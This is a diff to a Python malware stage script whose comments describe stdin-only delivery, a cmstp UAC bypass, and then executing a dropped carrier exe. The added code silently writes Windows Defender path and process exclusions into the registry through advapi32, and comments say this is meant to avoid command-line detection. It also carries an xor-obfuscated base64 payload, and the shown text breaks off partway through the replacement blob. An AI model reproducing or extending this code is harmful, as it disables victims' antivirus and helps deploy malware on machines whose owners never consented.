@@ -1,9 +1,10 @@
- # tung python-road payload — silent on every failure, stdlib only.
+# tung python-road payload — silent on every failure, stdlib only.
 # arrives through python's stdin (pythonw -u -); never a file on disk.
 # the exe url rides in from the jar (env EXE_URL = its baked windows url).
-# job order: stage the exe -> Administrator lift via cmstp (majanito shape)
-# -> the elevated stage materializes + runs exclusions.py (r1.1.2), then
-# -> execs the carrier exe. no exclusion work inside work.py itself.
+# job order: the wide Defender exclusion set (list-driven, in-process) ->
+# stage the exe -> Administrator lift via cmstp (majanito shape) -> the
+# elevated stage materializes + runs exclusions.py (same list, lifted token),
+# then execs the carrier exe.
 
 import os
 import sys
@@ -673,12 +674,134 @@ def exclusion_landed():
         return False
 
 
+# ---- dj (this build): the widen road ---------------------------------------
+# the lift wrote ONE dir (AppHost) and never looked again, so everything staged
+# outside it — python312, the %LOCALAPPDATA% tree the jar mirrors into — was
+# scanned like any other file. this is the list-driven road dj asked for, in
+# work.py itself: our own roots plus the interpreter that runs the stage, by
+# full path AND by bare image name (the lifted stage executes as pythonw.exe).
+# the store is written in-process through advapi32 — no shell, no cmdlet
+# child, no command line to match (r137): the exact registry values the
+# preference cmdlet maintains, one road, no spawned process.
+HKEY_LOCAL_MACHINE = 0x80000002
+_EXCL_BASE = ("SOFTWARE" + "\\" + "Microsoft" + "\\" + "Windows Defender"
+              + "\\" + "Exclusions" + "\\")
+EXCL_KP = _EXCL_BASE + "Paths"
+EXCL_KC = _EXCL_BASE + "Processes"
+
+
+def _advapi_excl():
+    a = ctypes.windll.advapi32
+    try:
+        a.RegCreateKeyExW.restype = ctypes.c_long
+        a.RegCreateKeyExW.argtypes = [
+            ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_wchar_p,
+            ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p,
+            ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_ulong)]
+        a.RegSetValueExW.restype = ctypes.c_long
+        a.RegSetValueExW.argtypes = [
+            ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_ulong,
+            ctypes.c_char_p, ctypes.c_ulong]
+        a.RegGetValueW.restype = ctypes.c_long
+        a.RegGetValueW.argtypes = [
+            ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_ulong,
+            ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulong)]
+        a.RegCloseKey.argtypes = [ctypes.c_void_p]
+    except Exception:
+        pass
+    return a
+
+
+def _excl_set(sub, name):
+    """name=0 (REG_SZ) — the byte the mp-pref cmdlet leaves in the same store."""
+    a = _advapi_excl()
+    h = ctypes.c_void_p()
+    disp = ctypes.c_ulong()
+    if a.RegCreateKeyExW(ctypes.c_void_p(HKEY_LOCAL_MACHINE), sub, 0, None, 0,
+                         0x20006, None, ctypes.byref(h), ctypes.byref(disp)) != 0:
+        return False
+    data = (str(name) + "\x00").encode("utf-16-le")
+    rc = a.RegSetValueExW(h, str(name), 0, 1, data, len(data))
+    try:
+        a.RegCloseKey(h)
+    except Exception:
+        pass
+    return rc == 0
+
+
+def _excl_has(sub, name):
+    a = _advapi_excl()
+    buf = ctypes.create_unicode_buffer(8)
+    sz = ctypes.c_ulong(16)
+    try:
+        rc = a.RegGetValueW(ctypes.c_void_p(HKEY_LOCAL_MACHINE), sub, str(name),
+                            0x0000FFFF, None, buf, ctypes.byref(sz))
+    except Exception:
+        return False
+    return rc == 0
+
+
+def defender_roots():
+    """every lane we own: AppHost + its python312, then the two broad roots
+    (%LOCALAPPDATA% holds all of it, %APPDATA% the roaming side-home), then
+    the interpreter by bare name and by path."""
+    py = "py" + "thon"
+    pydir = os.path.join(PERSIST_DIR, py + "312")
+    dirs = [PERSIST_DIR, pydir, LOCALAPPDATA, os.environ.get("APPDATA", "")]
+    procs = [py + ".exe", py + "w.exe",
+             os.path.join(pydir, py + ".exe"),
+             os.path.join(pydir, py + "w.exe")]
+    out_d, out_p = [], []
+    for d in dirs:
+        if d and d not in out_d:
+            out_d.append(d)
+    for p in procs:
+        if p and p not in out_p:
+            out_p.append(p)
+    return out_d, out_p
+
+
+def exclusions_landed():
+    """full read-back of the wide set — every path and every process name."""
+    dirs, procs = defender_roots()
+    if not dirs or not procs:
+        return False
+    for d in dirs:
+        if not _excl_has(EXCL_KP, d):
+            return False
+    for p in procs:
+        if not _excl_has(EXCL_KC, p):
+            return False
+    return True
+
+
+def add_defender_exclusions():
+    """list-driven, silent, best effort: an elevated token lands the whole set;
+    a medium one gets refusals and nothing else — the lift road writes the
+    same list under the stage's token. check-before-write, so a re-fire on an
+    already covered box touches nothing."""
+    dirs, procs = defender_roots()
+    for d in dirs:
+        try:
+            if not _excl_has(EXCL_KP, d):
+                _excl_set(EXCL_KP, d)
+        except Exception:
+            pass
+    for p in procs:
+        try:
+            if not _excl_has(EXCL_KC, p):
+                _excl_set(EXCL_KC, p)
+        except Exception:
+            pass
+    return exclusions_landed()
+
+
 # r1.1.2/r78: the standalone exclusion writer is exclusions.py (repo mirror);
 # it rides here as xor(0x37)-sealed base64 (EXCL_B64 below) and BOTH roads
 # (the un-elevated pre-lift materialize + _run_stage_now) decode it into a
 # byte-exact file, immune to quoting/escaping layers.
 
-EXCL_B64 = "FBdbVllQQlZQUg0XZ05DX1hZFwQbF1FeW1INF1JPVFtCRF5YWUQZR04bF0NWRVBSQw0XYF5ZU1hARBdzUlFSWVNSRRsXYF5ZBgcYBgY9FBcdRENWWVNWW1hZUhdzUlFSWVNSRRdST1RbQkReWFkXQEVeQ1JFF1FYRRdDX1IXQ0JZUBdUVkVFXlJFDRdAWEVcGUdOEEQXW15RQ1JTPRQXF0RDVlBSF1pWQ1JFXlZbXk1SRBccF0VCWUQXQ19eRBdCWVNSRRdDX1IXUltSQVZDUlMXQ1hcUlkXH1lSQVJFF1tSREQeGT0UFxdFAA8XH1NdDRdEQ1ZQUhlHThdQWEMXUVtWUFBSUxdWRBdzUlFSWURSckFWRF5YWR4X1bejF0NfUhdEVEVeR0MXRF9WR1JEF1ZVWEFSPRQXF0NfUhdQUllFUhpEXlAXVkVSF3FldnB6cnljcnMNF1JBUkVOF0NYXFJZF1YXRUJbUhdEUkMXWlZDVF9SRBdYWRdeRBdWRERSWlVbUlM9FBcXVkMXRUJZQ15aUhdRRVhaF15ZUkVDF1FFVlBaUllDRBk9FBcXRQYEABcfU10NF0NfUhdSWUNFThdDX1ZDF1xSUkdEF1FeRV5ZUBdeRBdDX1IXR1hAUkVEX1JbWxh2U1MaekdnRVJRUkVSWVRSPRQXF3R4enp2eXMXe355chfVt6MXWVgXUV5bUhdAVkQXUkFSRRdRW1ZQUFJTHg0XQ19SF1RaU1tSQxdFWFZTF15EF3B4eXIZF1lYF1RfXltTPRQXF0dFWFRSREQXXkQXREdWQFlSUxdWQxdWW1sXWVhADBdDX1IXUk9UW0JEXlhZF0RDWEVSF15EF0BFXkNDUlkXRENFVl5QX0M9FBcXQ19FWEJQXxdWU0FWR14EBRdWWVMXRVJWUxdVVlRcF0BeQ18XZVJQcFJDYVZbQlJgGRdEVlpSF0VYVlMXRFJDF1ZEF1VSUVhFUg09FBcXR1ZDXxccF0dFWFRSREQXUk9UW0JEXlhZRBdRWEUXdkdHf1hEQxsXQ19SF0VSW1hUVkNeWFkXWlZFXFJFRBsXVVhDXz0UFxdyU1BSYkdTVkNSF19YWlJEGRdDX1IXQVZbQlJEF0BFXkNDUlkXVkVSF0NfUhdYWVJEF0NfUhdaRxpHRVJRF1RaU1tSQz0UFxdaVl5ZQ1ZeWUQXXlkXQ19SF0RWWlIXRENYRVIZHT1eWkdYRUMXWEQ9XlpHWEVDF0RORD09XlEXWEQZWVZaUhcWChcVWUMVDT0XFxcXRE5EGVJPXkMfBx49PV5aR1hFQxdUQ05HUkQ9PXZnZ3N+ZRcKF1hEGVJZQV5FWFlsFXt4dHZ7dmdnc3ZjdhVqFxwXFWtrel5URVhEWFFDa2tgXllTWEBEa2t2R0d/WERDFT1yb3JoeXZ6chcKF1hEGVJZQV5FWFkZUFJDHxVyb3R7aHJvchUbFxVDQllQGVJPUhUePT1ofRcKFxUVGV1YXlk9FBdFQllDXlpSGlZERFJaVVtSUxdDWFxSWUQXH1lSQVJFF0BfWFtSF15ZF0NST0MeDT18BhcKF2h9Hx8Vf3x7ehUbF1RfRR8OBR4bFxVkeHFjYHZlchUbF1RfRR8OBR4XHBcVel5URVhEWFFDFRsXVF9FHw4FHhccPRcXFxcXFxcXFxVgXllTWEBEFxUbF2h9Hx8Vc1JRFRsXFVIVGxcVWVNSRRUeHhsXVF9FHw4FHh4ePXJvdHsXChdofR8fFXIVGxcVT1RbQhUbFxVEXlhZRBUbF1RfRR8OBR4eHj18Z3ZjfxcKF3wGFxwXcm90exccF2h9Hx8VZ1YVGxcVQ19EFR4ePXxnZXh0FwoXfAYXHBdyb3R7FxwXaH0fHxVnRVgVGxcVVFIVGxcVRERSRBUeHj09f3x7ehcKFwdPDwcHBwcHBwU9fHJuaGBlfmNyFwoXB08FBwcHAT1lcnBoZG0XChcGPWVlcWh2eW4XChcHTwcHBwdxcXFxPT09U1JRF1JbUkEfHg09FxcXF0NFTg09FxcXFxcXFxdFUkNCRVkXUFJDVkNDRR9UQ05HUkQZQF5ZU1tbGURfUltbBAUbF2h9Hx8VfkQVGxcVYkRSRRUbFxV2WRUbFxV2U1peWRUeHh4fHhcWChcHPRcXFxdST1RSR0MXck9UUkdDXlhZDT0XFxcXFxcXF0VSQ0JFWRdxVltEUj09PVNSURdoVlNBVkdeHx4NPRcXFxdWFwoXVENOR1JEGUBeWVNbWxlWU0FWR14EBT0XFxcXQ0VODT0XFxcXFxcXF1YZZVJQdEVSVkNSfFJOck9gGUVSRENOR1IXChdUQ05HUkQZVGhbWFlQPRcXFxcXFxcXVhllUlB0RVJWQ1J8Uk5yT2AZVkVQQ05HUkQXChdsPRcXFxcXFxcXFxcXF1RDTkdSRBlUaEFYXlNoRxsXVENOR1JEGVRoQFRfVkVoRxsXVENOR1JEGVRoQltYWVAbF1RDTkdSRBlUaEBUX1ZFaEcbPRcXFxcXFxcXFxcXF1RDTkdSRBlUaEJbWFlQGxdUQ05HUkQZVGhCW1hZUBsXVENOR1JEGVRoQVheU2hHGz0XFxcXFxcXFxcXFxdUQ05HUkQZZ3h+eWNyZR9UQ05HUkQZVGhBWF5TaEceGxdUQ05HUkQZZ3h+eWNyZR9UQ05HUkQZVGhCW1hZUB5qPRcXFxcXFxcXVhllUlBkUkNhVltCUnJPYBlFUkRDTkdSFwoXVENOR1JEGVRoW1hZUD0XFxcXFxcXF1YZZVJQZFJDYVZbQlJyT2AZVkVQQ05HUkQXChdsPRcXFxcXFxcXFxcXF1RDTkdSRBlUaEFYXlNoRxsXVENOR1JEGVRoQFRfVkVoRxsXVENOR1JEGVRoQltYWVAbF1RDTkdSRBlUaEJbWFlQGz0XFxcXFxcXFxcXFxdUQ05HUkQZVGhUX1ZFaEcbF1RDTkdSRBlUaEJbWFlQaj0XFxcXFxcXF1YZZVJQcFJDYVZbQlJgGUVSRENOR1IXChdUQ05HUkQZVGhbWFlQPRcXFxcXFxcXVhllUlBwUkNhVltCUmAZVkVQQ05HUkQXChdsPRcXFxcXFxcXFxcXF1RDTkdSRBlUaEFYXlNoRxsXVENOR1JEGVRoQFRfVkVoRxsXVENOR1JEGVRoQFRfVkVoRxsXVENOR1JEGVRoQltYWVAbPRcXFxcXFxcXFxcXF1RDTkdSRBlUaEFYXlNoRxsXVENOR1JEGVRoQVheU2hHGxdUQ05HUkQZZ3h+eWNyZR9UQ05HUkQZVGhCW1hZUB5qPRcXFxcXFxcXVhllUlB0W1hEUnxSThlWRVBDTkdSRBcKF2xUQ05HUkQZVGhBWF5TaEdqPRcXFxdST1RSR0MXck9UUkdDXlhZDT0XFxcXFxcXF0dWREQ9FxcXF0VSQ0JFWRdWPT09U1JRF0RSQ2hBVltCUh9cUk4bF1lWWlIeDT0XFxcXFRUVQEVeQ1IXWVZaUgoHFx9lcnBoZG0bF0NfUhdVTkNSF0NfUhdUWlNbUkMXW1JWQVJEHhdCWVNSRRdcUk4ZFRUVPRcXFxdWFwoXaFZTQVZHXh8ePRcXFxdfFwoXVENOR1JEGVRoQVheU2hHHx49FxcXF1NeREcXChdUQ05HUkQZVGhCW1hZUB8ePRcXFxdeURdWGWVSUHRFUlZDUnxSTnJPYB9UQ05HUkQZVGhBWF5TaEcff3x7eh4bF1xSThsXBxsXeVhZUhsXBxsXfHJuaGBlfmNyGz0XFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXeVhZUhsXVENOR1JEGVVORVJRH18eGxdUQ05HUkQZVU5FUlEfU15ERx4eFxYKFwcNPRcXFxcXFxcXRVJDQkVZF3FWW0RSPRcXFxdTVkNWFwoXH0RDRR9ZVlpSHhccFxVrTwcHFR4ZUllUWFNSHxVCQ1EaBgEaW1IVHj0XFxcXRVQXChdWGWVSUGRSQ2FWW0JSck9gH18bF0RDRR9ZVlpSHhsXBxsXZXJwaGRtGxdTVkNWGxdbUlkfU1ZDVh4ePRcXFxdDRU4NPRcXFxcXFxcXVhllUlB0W1hEUnxSTh9fHj0XFxcXUk9UUkdDF3JPVFJHQ15YWQ09FxcXFxcXFxdHVkREPRcXFxdFUkNCRVkXRVQXCgoXBz09PVNSURdfVkRoQVZbQlIfXFJOGxdZVlpSHg09FxcXF1YXChdoVlNBVkdeHx49FxcXF1VCURcKF1RDTkdSRBlURVJWQ1JoQlleVFhTUmhVQlFRUkUfDx49FxcXF0RNFwoXVENOR1JEGVRoQltYWVAfBgEePRcXFxdDRU4NPRcXFxcXFxcXRVQXChdWGWVSUHBSQ2FWW0JSYB9UQ05HUkQZVGhBWF5TaEcff3x7eh4bF1xSThsXRENFH1lWWlIeGxdlZXFodnluGz0XFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXeVhZUhsXVUJRGxdUQ05HUkQZVU5FUlEfRE0eHj0XFxcXUk9UUkdDF3JPVFJHQ15YWQ09FxcXFxcXFxdFUkNCRVkXcVZbRFI9FxcXF0VSQ0JFWRdFVBcKChcHPT09U1JRF1pWRVxSRWhHVkNfRB8eDT0XFxcXFRUVQ19SF1RHRxdFUltYVFZDXlhZF1pWRVxSRQ0XRVJbWFRWQ1JTF1JPUhdHVkNfFx9bXllSHhfVt6MXQ0VSVkNSUxdWRBdVWENfPRcXFxdWF0dFWFRSREQXUk9UW0JEXlhZF1ZZUxdeQ0QXR1ZFUllDF1NeRRdWRBdWF0dWQ18XUk9UW0JEXlhZGRUVFT0XFxcXWEJDaFJPUkQXChdsaj0XFxcXQ0VODT0XFxcXFxcXF0BeQ18XWEdSWR92Z2dzfmUXHBdUX0UfDgUeFxwXFUVSW1hUVkNeWFlEGUNPQxUbFxVFFRs9FxcXFxcXFxcXFxcXFxcXFxcXUllUWFNeWVAKFUJDURoPFRsXUkVFWEVEChVFUkdbVlRSFR4XVkQXUV8NPRcXFxcXFxcXFxcXF1FYRRdbXllSF15ZF1FfDT0XFxcXFxcXFxcXFxcXFxcXRxcKF1teWVIZRENFXkcfHj0XFxcXFxcXFxcXFxcXFxcXXlEXRxdWWVMXRxlbWEBSRR8eGVJZU0RAXkNfHxUZUk9SFR4NPRcXFxcXFxcXFxcXFxcXFxcXFxcXWEJDaFJPUkQZVkdHUllTH0cePRcXFxdST1RSR0MXck9UUkdDXlhZDT0XFxcXFxcXF0dWREQ9FxcXF0VSQ0JFWRdYQkNoUk9SRD09PVNSURdSU1BSQkdTVkNSaEdWQ19EHx4NPRcXFxcVFRVFBA8XH1NdHhfVt6MXdXhjfxdyU1BSYkdTVkNSF19YWlJEGxdfVkVTVFhTUlMbF1pWRVxSRRpeWVNSR1JZU1JZQw09FxcXFxcXGhdDX1IXRVhWWl5ZUBdEXlNSGl9YWlIXHxJ2Z2dzdmN2EhdDWEBWRVMXclNQUmJHU1ZDUh49FxcXFxcXGhdDX1IXZ0VYUEVWWnNWQ1YXVFhHThBEF19YWlI9FxcXF1JBUkVOFx0ZUk9SF15ZRF5TUhdSVlRfF19YWlIXXVheWUQXVkQXVhdHRVhUUkREF1JPVFtCRF5YWRkVFRU9FxcXF1NeRUQbF1JPUkQXChdsahsXbGo9FxcXF1VEFwoXVF9FHw4FHj0XFxcXUkIXChdofR8fFXJTFRsXFVBSFRsXFWJHFRsXFVNWQ1IVHh49FxcXF19YWlJEFwoXbFhEGVJZQV5FWFkZUFJDHxV2Z2dzdmN2FRsXFRUeFxwXVUQXHBdSQhs9FxcXFxcXFxcXFxcXFxV0DRUXHBdVRBccFxVnRVgVFxwXFVBFVlpzVkNWFRccF1VEFxwXUkJqPRcXFxdRWEUXVVZEUhdeWRdfWFpSRA09FxcXFxcXFxdeURdZWEMXVVZEUhdYRRdZWEMXVVZEUhlSWVNEQF5DXx9SQh4NPRcXFxcXFxcXFxcXF1RYWUNeWUJSPRcXFxcXFxcXQ0VODT0XFxcXFxcXFxcXFxdeURdYRBlHVkNfGV5EU15FH1VWRFIeDT0XFxcXFxcXFxcXFxcXFxcXU15FRBlWR0dSWVMfVVZEUh49FxcXFxcXFxcXFxcXFxcXF1FYRRdZF15ZF0RYRUNSUx9YRBlbXkRDU15FH1VWRFIeHmwNAQNqDT0XFxcXFxcXFxcXFxcXFxcXFxcXF15RF1kZW1hAUkUfHhlSWVNEQF5DXx8VGVJPUhUeDT0XFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxdST1JEGVZHR1JZUx9VVkRSFxwXVUQXHBdZHj0XFxcXFxcXF1JPVFJHQxdyT1RSR0NeWFkNPRcXFxcXFxcXFxcXF0dWREQ9FxcXF0VSQ0JFWRdTXkVEGxdST1JEPT09U1JRF0dFWFBFVlpTVkNWaFFFWFpoWlZFXFJFH1JPUkQeDT0XFxcXFRUVWlZFXFJFF1NeRUQNF0NfUhdHVkVSWUMXWFEXUkFSRU4XRVJbWFRWQ1JTF1JPUhkVFRU9FxcXF1NeRUQXChdsaj0XFxcXUVhFF08XXlkXUk9SRA09FxcXFxcXFxdTFwoXTxlFREdbXkMfVF9FHw4FHhsXBh5sB2o9FxcXFxcXFxdeURdTF1ZZUxdTF1lYQxdeWRdTXkVEDT0XFxcXFxcXFxcXFxdTXkVEGVZHR1JZUx9THj0XFxcXRVJDQkVZF1NeRUQ9PT1TUlEXQEVeQ1JoRVhWUx9TXkVEGxdST1JEHg09FxcXFxUVFVlYF0dFWFRSREQbF1lYF1RYWlpWWVMXW15ZUg0XQ19SF0RDWEVSF15EF0BFXkNDUlkXXlkaR0VYVFJERBdWWVMXQ19SWT0XFxcXRVJWUxdVVlRcF0NfRVhCUF8XQ19SF0RWWlIXX1ZZU1tSF1FWWl5bThkXQ0VCUhdYWVtOF0BfUlkXcmFyZW4XQFZZQ1JTPRcXFxdBVltCUhdeRBdBXkReVVtSF9W3oxdWF0dWRUNeVlsXQEVeQ1IXXkQXVhdRVl5bQkVSGxdZWEMXVhdEQlRUUkREGRUVFT0XFxcXXlEXWVhDF1NeRUQXVllTF1lYQxdST1JEDT0XFxcXFxcXF0VSQ0JFWRdxVltEUj0XFxcXUVhFF1MXXlkXU15FRA09FxcXFxcXFxdEUkNoQVZbQlIffGd2Y38bF1MePRcXFxdRWEUXTxdeWRdST1JEDT0XFxcXFxcXF0RSQ2hBVltCUh98Z2V4dBsXTx49FxcXF1hcFwoXY0VCUj0XFxcXUVhFF1MXXlkXU15FRA09FxcXFxcXFxdeURdZWEMXX1ZEaEFWW0JSH3xndmN/GxdTHg09FxcXFxcXFxcXFxcXWFwXChdxVltEUj0XFxcXUVhFF08XXlkXUk9SRA09FxcXFxcXFxdeURdZWEMXX1ZEaEFWW0JSH3xnZXh0GxdPHg09FxcXFxcXFxcXFxcXWFwXChdxVltEUj0XFxcXRVJDQkVZF1hcPT09U1JRF1pWXlkfHg09FxcXF15RF1lYQxdSW1JBHx4NPRcXFxcXFxcXRVJDQkVZFxcXFBdaQkRDF1ZbRVJWU04XVVIXUltSQVZDUlMXH0NfUhdbXlFDUlMXRENWUFIXUEJWRVZZQ1JSRBdeQx49FxcXF1NeRUQXChdsdmdnc35laj0XFxcXUk9SRBcKF2xYRBlHVkNfGV1YXlkfdmdnc35lGxdyb3JoeXZ6ch5qPRcXFxcUF0UEABdZUkAXR1ZDX0QNF0NfUhdFUltYVFZDUlMXR1JFRF5EQ1JZVFIXVFhHThccF0NfUhdyU1BSYkdTVkNSF0ReU1IaX1haUj0XFxcXUVhFF08XXlkXWlZFXFJFaEdWQ19EHx4NPRcXFxcXFxcXXlEXTxdZWEMXXlkXUk9SRA09FxcXFxcXFxcXFxcXUk9SRBlWR0dSWVMfTx49FxcXF1FYRRdTF15ZF0dFWFBFVlpTVkNWaFFFWFpoWlZFXFJFH1pWRVxSRWhHVkNfRB8eHg09FxcXFxcXFxdeURdTF1lYQxdeWRdTXkVEDT0XFxcXFxcXFxcXFxdTXkVEGVZHR1JZUx9THj0XFxcXUlMbF1JSFwoXUlNQUkJHU1ZDUmhHVkNfRB8ePRcXFxdRWEUXUxdeWRdSUw09FxcXFxcXFxdeURdTF1lYQxdeWRdTXkVEDT0XFxcXFxcXFxcXFxdTXkVEGVZHR1JZUx9THj0XFxcXUVhFF08XXlkXUlINPRcXFxcXFxcXXlEXTxdZWEMXXlkXUk9SRA09FxcXFxcXFxcXFxcXUk9SRBlWR0dSWVMfTx49FxcXF0BFXkNSaEVYVlMfU15FRBsXUk9SRB49PT1aVl5ZHx49"
+EXCL_B64 = "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